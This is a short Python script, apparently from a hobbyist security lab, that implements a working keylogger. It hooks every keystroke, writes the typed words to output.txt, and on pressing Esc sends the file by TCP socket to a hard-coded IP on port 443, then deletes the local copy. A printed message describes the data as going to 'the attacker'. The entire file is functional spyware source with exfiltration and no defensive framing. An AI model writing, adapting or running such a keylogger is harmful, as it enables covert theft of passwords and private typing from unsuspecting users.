# Author : Eduardo Esteves - copilotlabxgmail.com
# Perú-2024
print("""
        ################################
        #********Copilot Labx *********# 
        ################################""")


import keyboard
import sys
import os
import socket
import time

word = ""

def pulsar(pulsacion):
  
    global word
    if pulsacion.event_type == keyboard.KEY_DOWN:
        if pulsacion.name == 'space':
            guardar_palabra_espacio()
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
            word += pulsacion.name

keyboard.hook(pulsar)

def  guardar_palabra_espacio():
     with open("output.txt", "a") as file:
         file.write(word + "\n" ) 
     print(f"palabra registrada:  {word}")
     reset_word()
def reset_word():
    global word
    word = ""
def enviar_via_sockets(archivo_a_enviar, ip_destino, puerto_destino):
    try: 
        with open(archivo_a_enviar, 'rb') as file:
             contenido = file.read()
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as conexion:
            conexion.connect((ip_destino,puerto_destino))
            conexion.sendall(contenido)
            os.remove("output.txt")
            time.sleep(6)
            sys.exit()
    except Exception as e:
        print("Hubo un error en la conexion: ", e)
    
def detener_script():
    print("Detenemos script y enviamos los datos al atacante")
    keyboard.unhook_all()
    enviar_via_sockets(archivo_a_enviar, ip_destino, puerto_destino)
    time.sleep(12)


ip_destino = '172.16.209.140'
puerto_destino = 443
archivo_a_enviar = 'output.txt'


try:
    keyboard.wait("esc")
    detener_script()
except KeyboardInterrupt:
    print("Script Detenido")
    pass
